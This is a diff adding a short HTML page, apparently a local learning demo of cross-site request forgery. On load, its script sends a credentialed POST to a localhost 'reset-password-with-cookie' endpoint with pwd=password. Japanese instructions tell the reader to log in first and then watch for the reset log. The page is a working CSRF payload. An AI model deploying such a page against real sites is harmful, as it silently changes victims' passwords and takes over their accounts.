@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+</head>
+<body>
+  <script>
+//     const data = `\
+// ----BNDRY\n\
+// Content-Type: pplication/x-www-form-urlencoded\n\
+// \n\
+// pwd=password\n\
+// \n\
+// ----BNDRY--\n\
+    const data = `\
+pwd=password\n\
+`
+    const req = new XMLHttpRequest();
+    req.open("POST", "http://127.0.0.1:4000/reset-password-with-cookie")
+    req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
+    req.withCredentials = true
+    req.send(data)
+  </script>
+  <p>Cookieを使ったpassword変更</p>
+  <p><a href="http://127.0.0.1:4000/login">http://127.0.0.1:4000/login</a>でログインしてください</p>
+  <p>その後、このページを読み込むと、reset passwordというログが見えるはずです。</p>
+</body>
+</html>
